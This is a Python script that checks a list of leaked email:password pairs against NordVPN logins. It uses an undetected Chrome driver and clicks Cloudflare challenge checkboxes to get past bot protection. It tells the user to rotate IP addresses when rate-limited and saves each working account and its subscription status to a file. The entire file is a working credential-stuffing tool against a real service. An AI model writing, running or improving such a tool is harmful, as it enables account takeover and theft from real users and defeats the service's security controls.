import time
import os
import undetected_chromedriver as stealthdriver
from urllib.error import ContentTooShortError
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import WebDriverException
import sys
from pathlib import Path
from selenium.webdriver.common.by import By
from header import title

user = []
password = []
retries = 0
counter = 0

while True:
    print("Window Size (minimum 1200 x 300):")
    print("1) Small")
    print("2) Medium")
    print("3) Large")
    window_size = int(input("Enter Size: "))
    match window_size:
        case 1:
            window_size = 1200, 300
            break
        case 2:
            window_size = 1200, 500
            break
        case 3:
            window_size = 1200, 800
            break
        case _:
            print("Invalid size")
if getattr(sys, 'frozen', False):  # and hasattr(sys, 'MEIPASS'):
    user_directory = str(Path(sys.executable).parent) + "\\nord.txt"
    save_directory = str(Path(sys.executable).parent) + "\\valid_accounts"
    os.makedirs(save_directory, exist_ok=True)
    save_file = "\\valid_accounts.txt"
else:
    user_directory = str(Path(__file__).parent) + "/nord.txt"
    save_directory = str(Path(__file__).parent) + "/valid_accounts"
    os.makedirs(save_directory, exist_ok=True)
    save_file = "/valid_accounts.txt"
try:
    os.remove(save_directory + save_file)
except FileNotFoundError:
    pass
try:
    with open(user_directory, 'r') as combos:
        for i in combos.readlines():
            user.append(i.split(":")[0])
            password.append(i.split(":")[1].split(" ")[0].strip())
except FileNotFoundError as e:
    print("No combolist found in: " + user_directory + "\nPlease add 'nord.txt' and try again.\nPress Enter to end.")
    input()
    exit()
index = 0
for i in os.listdir(str(Path(__file__).parent)):
    if 'resume' in i:
        with open('resume_from', 'r') as read_resume_index:
            index = int(read_resume_index.readline())
title()
while index != len(user):
    try:
        if retries > 5:
            print("\n\nToo many errors. \n\n1) Undetected Chromedriver can't bypass Cloudflare if you are using a "
                  "blacklisted datacenter IP address. If this is the case, try changing your IP and try again. "
                  "\n\n2) Could be an unknown error related to Chrome Version. Wait a moment, and try again."
                  "\n\n3) Make sure 'undetected-chromedriver' and the correct Chrome version is installed."
                  "\nEnding.")
            exit()
        with open(save_directory + save_file, 'a') as accounts:
            browser_options = stealthdriver.ChromeOptions()
            browser_options.add_argument(
                'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                'Chrome/116.0.0.0 Safari/537.36')
            # browser_options.add_argument("--auto-open-devtools-for-tabs")
            # browser_options.add_argument('--headless=new')
            browser = stealthdriver.Chrome(version_main=102)
            page = 'https://www.nordvpn.com/'
            browser.set_window_size(window_size[0], window_size[1])
            browser.get(page)
            time.sleep(3)
            print('\rTrying Combo {} out of {}'.format(index + 1, len(user)), end='')
            continue_button = browser.find_element(By.XPATH, '//*[@id="js-HeaderV3__mini-nav"]/li[3]/a')
            continue_button.click()
            time.sleep(3)
            browser.switch_to.window(browser.window_handles[1])
            time.sleep(1)
            if browser.find_elements(By.XPATH, '/html/body/div/div/div/main/h1'):
                error = browser.find_element(By.XPATH, '/html/body/div/div/div/main/h1').text
                if 'You sent' in error:
                    with open('resume_from', 'w') as resume:
                        resume.write(str(index))
                    resume.close()
                    print("\n\n[429] Too many requests. Please change VPN/Proxy and try again.")
                    print("Ending.")
                    exit()
            start = time.time()
            while True:
                if browser.find_elements(By.XPATH, '/html/body/div/div/div/main/form/fieldset/div/span/input'):
                    break
                if time.time() - start > 30 and counter == 0:
                    print("\n\nCloudflare Time Out")
                    exit()
                if counter > 5:
                    print("\n\nCould not bypass Cloudflare IUAM."
                          "\nEnding.")
                    exit()
                if browser.find_elements(By.XPATH, '/html/body/div[1]/div/div[1]/div/div/iframe'):
                    iframe = browser.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div/div/iframe')
                    browser.switch_to.frame(iframe)
                    time.sleep(1)
                    if browser.find_elements(By.CSS_SELECTOR, 'input[type=checkbox]'):
                        verification = browser.find_element(By.CSS_SELECTOR, 'input[type=checkbox]')
                        verification.click()
                        counter += 1
                browser.switch_to.default_content()
                time.sleep(5)
            email_box = browser.find_element(By.XPATH, '/html/body/div/div/div/main/form/fieldset/div/span/input')
            continue_button = browser.find_element(By.XPATH, '//*[@id="app"]/div/div/main/form/fieldset/button')
            email_box.send_keys(user[index])
            continue_button.click()
            time.sleep(5)
            password_box = browser.find_element(By.XPATH, 'html/body/div/div/div/main/form/fieldset/div[3]/span/input')
            login_button = browser.find_element(By.XPATH, 'html/body/div/div/div/main/form/fieldset/button')
            password_box.send_keys(password[index])
            login_button.click()
            time.sleep(4)
            if 'https://my.nordaccount.com/dashboard/' in browser.current_url:
                if browser.find_elements(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div[2]/div[2]/div[3]/div/div[1]/div[2]/div[1]/div/div[1]/div[2]/span/div') or browser.find_elements(By.XPATH, '//*[@id="app"]/div[2]/div[2]/div[2]/div[2]/div[3]/div/div[1]/div[2]/div[1]/div/a/div/div[1]/div/span/div'):
                    print(" | {}:{} ---> Success! (Expiring Soon)".format(user[index], password[index]))
                    accounts.write(user[index] + ":" + password[index] + " ---> Valid\n")
                # if browser.find_elements(By.XPATH, ':
                # print(" | {}:{} ---> Success!".format(user[index], password[index]))
                # accounts.write(user[index] + ":" + password[index] + " ---> Valid\n")
                elif browser.find_elements(By.XPATH,
                                         '//*[@id="app"]/div[2]/div[2]/div[2]/div[2]/div[3]/div/div[1]/div[1]/div/div/div/a') or browser.find_elements(
                        By.XPATH,
                        '//*[@id="app"]/div[2]/div[2]/div[2]/div[2]/div[4]/div/div[1]/div[1]/div/div/div/a'):
                    print(" | {}:{} ---> Expired!".format(user[index], password[index]))
                else:
                    print(" | {}:{} ---> No Subscription on Account".format(user[index], password[index]))
            else:
                print(" | {}:{} ---> Account not working".format(user[index], password[index]))
            browser.quit()
            index += 1
            retries = 0
    except NoSuchElementException as b:
        print(" - Error: No Such Element - Retrying")
        retries += 1
    except WebDriverException as e:
        print(" - Error: Web Driver Exception - Retrying")
        retries += 1
    except NameError:
        print(" - Error: Connection Error - Retrying")
        retries += 1
    except ContentTooShortError as c:
        print(" - Error: Url Lib Exception - Retrying")
        retries += 1